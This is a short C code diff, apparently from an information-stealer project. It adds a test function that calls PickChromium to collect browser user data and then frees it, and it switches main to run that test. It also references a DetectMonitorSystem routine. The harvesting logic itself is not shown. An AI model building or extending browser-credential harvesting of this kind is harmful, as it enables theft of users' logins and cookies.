@@ -1864,6 +1864,19 @@ CLEANUP:
 	return Result;
 }
 
+void test116(void) {
+	DWORD dwNumberOfUserDatas = 0;
+	PUSER_DATA* pResult = NULL;
+	DWORD i = 0;
+
+	pResult = PickChromium(&dwNumberOfUserDatas);
+	for (i = 0; i < dwNumberOfUserDatas; i++) {
+		FreeUserData(pResult[i]);
+	}
+
+	FREE(pResult);
+}
+
 VOID DetectMonitorSystem(VOID)
 {
 	while (TRUE) {
@@ -2092,6 +2105,7 @@ int main(void) {
 	//test113();
 	//test114();
 	//test115();
-	Final();
+	test116();
+	//Final();
 	return 0;
 }
